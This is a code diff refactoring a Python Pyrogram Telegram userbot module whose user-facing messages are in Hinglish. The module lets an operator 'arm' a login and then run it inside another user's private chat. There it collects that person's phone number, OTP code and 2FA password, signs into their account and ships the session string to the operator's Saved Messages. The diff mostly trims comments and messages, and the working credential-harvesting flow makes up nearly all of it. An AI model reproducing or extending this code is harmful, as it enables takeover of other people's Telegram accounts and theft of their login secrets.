@@ -11,7 +11,6 @@ Flow:
 
 .addsession <string> — direct session save (Saved Messages)
 """
-import asyncio
 from typing import Any
 
 from pyrogram import Client, filters
@@ -32,9 +31,7 @@ from modules.owner.sudoers import owner_or_sudo, SUDO_USERS
 
 PREFIXES = [".", "!"]
 
-# chat_id -> state dict
 _LOGIN: dict[int, dict[str, Any]] = {}
-# operator (owner/sudo) armed — next private chat they open with .login
 _ARMED: set[int] = set()
 
 
@@ -47,7 +44,6 @@ def _is_op(uid: int | None) -> bool:
 
 
 async def _send_to_saved(text: str):
-    """Session / secrets ONLY to owner's Saved Messages."""
     try:
         await app.send_message("me", text)
         return True
@@ -69,7 +65,6 @@ async def _cleanup_temp(state: dict):
 @app.on_message(filters.command(["login"], prefixes=PREFIXES))
 @owner_or_sudo
 async def login_cmd(client, message: Message):
-    """Start login in current private chat, or arm for next DM."""
     me = await client.get_me()
     op_id = message.from_user.id if message.from_user else me.id
 
@@ -79,14 +74,13 @@ async def login_cmd(client, message: Message):
             "🔑 <b>LOGIN ARMED</b>\n\n"
             "Ab jis user ke <b>DM</b> me jao aur wahan likho:\n"
             "<code>.login</code>\n\n"
-            "Phir phone → OTP → password flow chalega.\n"
+            "Phir phone → OTP → password flow.\n"
             "Session <b>sirf Saved Messages</b> me save hogi.\n\n"
             "Cancel: <code>.cancellogin</code>"
         )
         return
 
     chat_id = message.chat.id
-    # cancel previous for this chat
     if chat_id in _LOGIN:
         await _cleanup_temp(_LOGIN[chat_id])
 
@@ -104,9 +98,9 @@ async def login_cmd(client, message: Message):
         "━━━━━━━━━━━━━━━━\n\n"
         "📱 <b>Step 1:</b> Phone number bhejo\n"
         "Format: <code>+91XXXXXXXXXX</code>\n\n"
-        "Phir OTP aayega → yahan bhejo.\n"
+        "Phir OTP → yahan bhejo.\n"
         "2FA ho to password bhejo.\n\n"
-        "🔐 Session <b>sirf mere Saved Messages</b> me jayegi.\n"
+        "🔐 Session <b>sirf Saved Messages</b> me jayegi.\n"
         "❌ Cancel: <code>.cancellogin</code>"
     )
 
@@ -128,7 +122,6 @@ async def cancellogin_cmd(client, message: Message):
 @app.on_message(filters.command(["addsession"], prefixes=PREFIXES))
 @owner_or_sudo
 async def addsession_cmd(client, message: Message):
-    """Save an existing session string to Saved Messages only."""
     if len(message.command) < 2:
         await message.reply_text(
             "Usage:\n<code>.addsession SESSION_STRING</code>\n\n"
@@ -141,7 +134,6 @@ async def addsession_cmd(client, message: Message):
         await message.reply_text("❌ Session string bahut short / invalid.")
         return
 
-    # Try validate by connecting briefly
     status = await message.reply_text("⏳ Session check…")
     temp = Client(
         name="validate_sess",
@@ -171,11 +163,7 @@ async def addsession_cmd(client, message: Message):
                 "Saved Messages me bhej diya 🔐"
             )
         else:
-            await status.edit_text(
-                "✅ Session valid, lekin Saved Messages fail.\n"
-                "String yahan (sirf aapko dikhe):\n"
-                f"<code>{session[:30]}…</code>"
-            )
+            await status.edit_text("✅ Session valid, Saved Messages fail.")
     except Exception as e:
         try:
             await temp.disconnect()
@@ -183,7 +171,6 @@ async def addsession_cmd(client, message: Message):
             pass
         await status.edit_text(f"❌ Invalid session:\n<code>{type(e).__name__}: {e}</code>")
 
-    # delete command message so session not left in group/dm history if possible
     try:
         await message.delete()
     except Exception:
@@ -193,41 +180,33 @@ async def addsession_cmd(client, message: Message):
 @app.on_message(filters.command(["mylogin", "logins"], prefixes=PREFIXES))
 @owner_or_sudo
 async def mylogin_cmd(client, message: Message):
-    active = len(_LOGIN)
-    armed = len(_ARMED)
     await message.reply_text(
         f"🔑 <b>Login status</b>\n"
-        f"Active flows: <code>{active}</code>\n"
-        f"Armed operators: <code>{armed}</code>\n\n"
-        f"<code>.login</code> — start\n"
+        f"Active flows: <code>{len(_LOGIN)}</code>\n"
+        f"Armed: <code>{len(_ARMED)}</code>\n\n"
+        f"<code>.login</code> — start in DM\n"
         f"<code>.addsession</code> — paste string\n"
         f"<code>.cancellogin</code> — cancel"
     )
 
 
-@app.on_message(
-    filters.private & filters.text & ~filters.command(
-        ["login", "cancellogin", "logoutlogin", "addsession", "mylogin", "logins"],
-        prefixes=PREFIXES,
-    ),
-    group=-5,
-)
+@app.on_message(filters.private & filters.text, group=5)
 async def login_steps(client, message: Message):
-    """Handle phone / OTP / 2FA for active login chats."""
+    """Phone / OTP / 2FA — runs AFTER command handlers (group=0)."""
     chat_id = message.chat.id
     state = _LOGIN.get(chat_id)
     if not state:
         return
 
-    # Only process if message is from operator OR from the other party in DM
-    # (owner may type on behalf of user, or user types themselves)
     text = (message.text or "").strip()
-    if not text or text.startswith(".") or text.startswith("!"):
+    if not text:
+        return
+    # ignore commands
+    if text.startswith(".") or text.startswith("!"):
         return
 
     step = state.get("step")
 
-    # ---------- PHONE ----------
     if step == "phone":
         phone = text.replace(" ", "").replace("-", "")
         if not phone.startswith("+") or not phone[1:].isdigit() or len(phone) < 10:
@@ -251,36 +230,34 @@ async def login_steps(client, message: Message):
             state["temp_client"] = temp
             state["step"] = "code"
             await status.edit_text(
-                "✅ Code bhej diya Telegram pe.\n\n"
-                "📨 <b>Step 2:</b> OTP / code yahan bhejo\n"
-                "(Telegram app me jo code aaya)"
+                "✅ Code bhej diya.\n\n"
+                "📨 <b>Step 2:</b> OTP yahan bhejo"
             )
         except FloodWait as e:
             await _cleanup_temp({"temp_client": temp})
-            await status.edit_text(f"⏳ FloodWait: {e.value}s baad try karo.")
+            await status.edit_text(f"⏳ FloodWait: {e.value}s")
             _LOGIN.pop(chat_id, None)
         except PhoneNumberInvalid:
             await _cleanup_temp({"temp_client": temp})
-            await status.edit_text("❌ Phone number invalid.")
+            await status.edit_text("❌ Phone invalid.")
         except PhoneNumberBanned:
             await _cleanup_temp({"temp_client": temp})
-            await status.edit_text("❌ Ye number Telegram se banned hai.")
+            await status.edit_text("❌ Number banned.")
         except Exception as e:
             await _cleanup_temp({"temp_client": temp})
-            await status.edit_text(f"❌ Error: <code>{type(e).__name__}: {e}</code>")
+            await status.edit_text(f"❌ <code>{type(e).__name__}: {e}</code>")
             _LOGIN.pop(chat_id, None)
         return
 
-    # ---------- OTP ----------
     if step == "code":
         code = text.replace(" ", "").replace("-", "")
         if not code.isdigit():
             await message.reply_text("❌ Sirf OTP digits bhejo.")
             return
 
-        temp: Client = state.get("temp_client")
+        temp = state.get("temp_client")
         if not temp:
-            await message.reply_text("❌ Session lost. Phir se <code>.login</code>")
+            await message.reply_text("❌ Session lost. <code>.login</code>")
             _LOGIN.pop(chat_id, None)
             return
 
@@ -312,20 +289,19 @@ async def login_steps(client, message: Message):
             await status.edit_text(
                 f"✅ <b>Login success!</b>\n"
                 f"👤 {name} | <code>{me.id}</code>\n"
-                + ("🔐 Session → <b>Saved Messages</b>" if ok else "⚠️ Saved Messages fail")
+                + ("🔐 → Saved Messages" if ok else "⚠️ Saved Messages fail")
             )
         except SessionPasswordNeeded:
             state["step"] = "password"
             await status.edit_text(
-                "🔒 <b>2FA ON hai</b>\n\n"
-                "<b>Step 3:</b> Cloud password yahan bhejo"
+                "🔒 <b>2FA ON</b>\n\n<b>Step 3:</b> Cloud password bhejo"
             )
         except PhoneCodeInvalid:
-            await status.edit_text("❌ OTP galat. Phir se code bhejo.")
+            await status.edit_text("❌ OTP galat. Dobara bhejo.")
         except PhoneCodeExpired:
             await _cleanup_temp(state)
             _LOGIN.pop(chat_id, None)
-            await status.edit_text("❌ OTP expire. Phir se <code>.login</code>")
+            await status.edit_text("❌ OTP expire. <code>.login</code> dobara.")
         except FloodWait as e:
             await status.edit_text(f"⏳ FloodWait {e.value}s")
         except Exception as e:
@@ -334,12 +310,11 @@ async def login_steps(client, message: Message):
             await status.edit_text(f"❌ <code>{type(e).__name__}: {e}</code>")
         return
 
-    # ---------- 2FA PASSWORD ----------
     if step == "password":
         password = text
-        temp: Client = state.get("temp_client")
+        temp = state.get("temp_client")
         if not temp:
-            await message.reply_text("❌ Session lost. <code>.login</code> dobara.")
+            await message.reply_text("❌ Session lost. <code>.login</code>")
             _LOGIN.pop(chat_id, None)
             return
 
@@ -367,10 +342,10 @@ async def login_steps(client, message: Message):
             await status.edit_text(
                 f"✅ <b>Login success!</b>\n"
                 f"👤 {name} | <code>{me.id}</code>\n"
-                + ("🔐 Session → <b>Saved Messages</b>" if ok else "⚠️ Saved Messages fail")
+                + ("🔐 → Saved Messages" if ok else "⚠️ Saved Messages fail")
             )
         except PasswordHashInvalid:
-            await status.edit_text("❌ Password galat. Phir se bhejo.")
+            await status.edit_text("❌ Password galat. Dobara bhejo.")
         except Exception as e:
             await _cleanup_temp(state)
             _LOGIN.pop(chat_id, None)
